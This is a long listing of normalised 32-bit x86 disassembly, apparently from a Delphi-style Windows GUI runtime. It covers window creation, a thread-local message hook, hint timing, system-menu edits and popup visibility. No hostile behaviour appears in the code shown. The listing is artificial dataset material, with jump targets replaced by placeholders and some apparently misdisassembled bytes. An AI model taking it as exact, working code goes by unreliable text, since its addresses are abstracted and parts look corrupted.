test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
movzx eax [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_3a7a494
movzx edx [ ebp - 0x1 ]
call sub_3acd0ec
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_3acc960
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
movzx eax [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x273 ] 0x1
je r-xdata
cmp [ ebx + 0x273 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_3a7a33c
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_3a7a510
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_3a7a494
mov edx eax
movzx ecx [ ebp - 0x1 ]
mov eax ebx
call sub_3acd064
test al al
je r-xdata
inc esi
sub_3acd3f8
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_3acc974
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_3acc960
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x273 ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_3acd450
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_3acd3f8
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3acd4ca
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_3acd2a8
pop ecx
push ebp
mov al 0x2
call sub_3acd2a8
pop ecx
push ebp
mov al 0x3
call sub_3acd2a8
pop ecx
push ebp
mov al 0x4
call sub_3acd2a8
pop ecx
push ebp
mov al 0x5
call sub_3acd2a8
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_3a64380
retn
sub_3acd4d8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3acd034
xor eax eax
push ebp
push sub_3acd551
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3acd450
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_3acd03c
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_3acd56c
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_3a652a0
pop esi
pop ebx
retn
cmp [ ebx + 0x84 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x84 ]
call sub_3a652f4
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_3acd5c4
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push sub_3acd5f5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_3ad032c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_3acd618
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_3aae0c4
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_3ad03d8
sub_3acd674
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_3acf060
sub_3acd6b8
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xad ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_3acd674
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_3acd618
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_3acd72c
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_3acd788
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_3acd7b8
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_3acd7e0
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_3acd788
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_3acd7b8
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_3acd7b8
sub_3acd810
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
movzx eax bl
mov eax [ eax * 4 + rw-data ]
push eax
push [ esi + 0x4 ]
push [ esi ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax edi
call sub_3accb24
pop edi
pop esi
pop ebx
retn
sub_3acd840
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x58 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x58 ]
mov edx esi
call sub_3a7a494
call sub_3a64380
inc esi
dec ebx
jne r-xdata
sub_3acd89c
push ebx
push esi
push edi
push ebp
mov edi eax
xor ebp ebp
mov eax edi
call sub_3acc928
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax edi
call sub_3acd878
mov eax edi
call sub_3acc928
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
call sub_3acc914
mov ebp eax
jmp r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
call sub_3acc914
mov ebp eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_3acc914
call sub_3acc688
test al al
je r-xdata
mov edx ebx
mov eax edi
call sub_3acc914
call sub_3acc688
test al al
je r-xdata
sub_3acd92c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_3a83664
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_3acf68c
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebx + 0x98 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebx + 0xb0 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0xa5 ] 0x1
mov [ ebx + 0xbc ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a8fc88
mov esi eax
mov [ ebx + 0xa0 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_3a90098
mov eax [ ebx + 0xa0 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_3acff6c
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_3a6e228
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_3acf898
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_3a6e25c
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_3a6a174
lea eax [ ebp - 0x101 ]
push eax
call CharNextA
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_3a65510
mov [ ebx + 0xd4 ] 0x0
push ebx
push sub_3acf100
call sub_3a847e0
mov [ ebx + 0xc8 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0xa6 ] 0x1
xor eax eax
mov [ ebx + 0xa8 ] eax
mov eax ebx
call sub_3ad0180
mov eax ebx
call sub_3ad0ce4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_3acdc80
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3acdb45
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax esi
call sub_3ad0cf4
mov [ esp + 0x4 ] esi
mov [ esp ] sub_3acf68c
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_3acf898
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa8 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0xa5 ] 0x0
mov eax esi
call sub_3ad03d8
xor edx edx
mov eax esi
call sub_3acfc94
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a836b0
mov eax [ esi + 0xc8 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
push esi
push sub_3ace34c
mov eax esi
call sub_3acf348
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
call sub_3a84894
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xac ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_3a66cb4
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xb0 ]
call sub_3a64380
mov eax [ esi + 0x90 ]
call sub_3a64380
mov eax [ esi + 0x98 ]
call sub_3a64380
mov eax [ esi + 0xa0 ]
call sub_3a64380
test bl bl
jle r-xdata
call sub_3a847bc
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call __imp_SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3acdc80
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_3acde19
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xac ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3acde20
lea eax [ ebp - 0x2c ]
call sub_3a652a0
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_3ace4bc
call sub_3a84724
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x84ca0000
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_3a65730
mov ecx eax
mov edx [ rw-data ]
xor eax eax
call sub_3a67f50
mov [ ebx + 0x30 ] eax
mov [ ebx + 0xac ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_3aceb7c
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call __imp_SendMessageA
mov eax ebx
call sub_3aceb7c
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_3acde28
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_3acc97c
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_3acde88
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_3a7a33c
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_3ab7c38
cmp ebx eax
je r-xdata
sub_3acdf00
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_3acde88
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_3a7a494
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_3ace00c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0xd0 ]
call sub_3a6641c
mov edx eax
test edx edx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc edx
xor eax eax
inc eax
dec edx
jne r-xdata
mov edx [ ebx + 0xd0 ]
xor ecx ecx
mov [ edx + esi * 4 + 0x4 ] ecx
mov eax [ ebx + 0xd0 ]
mov [ eax + esi * 4 ] 0xffffffff
jmp r-xdata
lea esi [ eax + eax * 2 ]
mov ecx [ ebx + 0xd0 ]
cmp edi [ ecx + esi * 4 + 0x4 ]
jne r-xdata
sub_3ace05c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_3a7a494
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_3ace1b8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
cmp [ esi + 0x9c ] 0x0
jle r-xdata
cmp [ esi + 0x9c ] 0x0
jne r-xdata
dec [ esi + 0x9c ]
cmp [ esi + 0x9c ] 0x0
jne r-xdata
inc [ esi + 0x9c ]
jmp r-xdata
mov eax esi
call sub_3ad0b60
push eax
push r-xdata
call EnumWindows
cmp [ esi + 0x44 ] 0x0
je r-xdata
cmp [ esi + 0x44 ] 0x0
je r-xdata
mov eax [ esi + 0x98 ]
mov edi [ eax + 0x8 ]
dec edi
cmp edi 0x0
jl r-xdata
mov eax [ rw-data ]
call sub_3ad1240
test al al
je r-xdata
mov eax [ esi + 0x98 ]
mov edi [ eax + 0x8 ]
dec edi
cmp edi 0x0
jl r-xdata
mov eax [ rw-data ]
call sub_3ad1240
test al al
je r-xdata
cmp bl 0x1
cmc
sbb eax eax
push eax
mov edx edi
mov eax [ esi + 0x98 ]
call sub_3a7a494
push eax
call ShowOwnedPopups
dec edi
cmp edi 0xffffffff
jne r-xdata
mov eax [ rw-data ]
call sub_3a6641c
mov edi eax
cmp edi 0x0
jl r-xdata
mov eax [ esi + 0x98 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x0
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_3a665d0
add esp 0x4
cmp bl 0x1
cmc
sbb eax eax
push eax
mov edx edi
mov eax [ esi + 0x98 ]
call sub_3a7a494
push eax
call ShowOwnedPopups
dec edi
cmp edi 0xffffffff
jne r-xdata
mov eax [ rw-data ]
call sub_3a6641c
mov edi eax
cmp edi 0x0
jl r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax + edi * 4 ]
push eax
call ShowWindow
dec edi
cmp edi 0xffffffff
jne r-xdata
push 0x5
mov eax [ rw-data ]
mov eax [ eax + edi * 4 ]
push eax
call ShowWindow
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_3ace34c
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ edi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ edi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_3a6e3bc
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_3accee0
mov eax [ rw-data ]
call sub_3acd560
mov eax edi
call sub_3ad1240
test al al
je r-xdata
mov cl 0x1
mov dl 0x1
mov eax [ edi + 0x30 ]
call sub_3ac4080
mov cl 0x1
xor edx edx
mov eax [ edi + 0x30 ]
call sub_3ac4080
sub_3ace3c8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3ace425
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x162 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ace42c
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_3a65498
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x164 ]
call [ ebx + 0x160 ]
sub_3ace434
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_3ace470
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3aceb7c
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_3ace4bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_3aceb5e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3ace34c
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
movzx edx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_3acf970
jmp r-xdata
cmp eax 0x11
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx esi
call sub_3a7a494
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1c
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov ebx eax
mov eax ebx
call sub_3ab7c38
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x1d
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
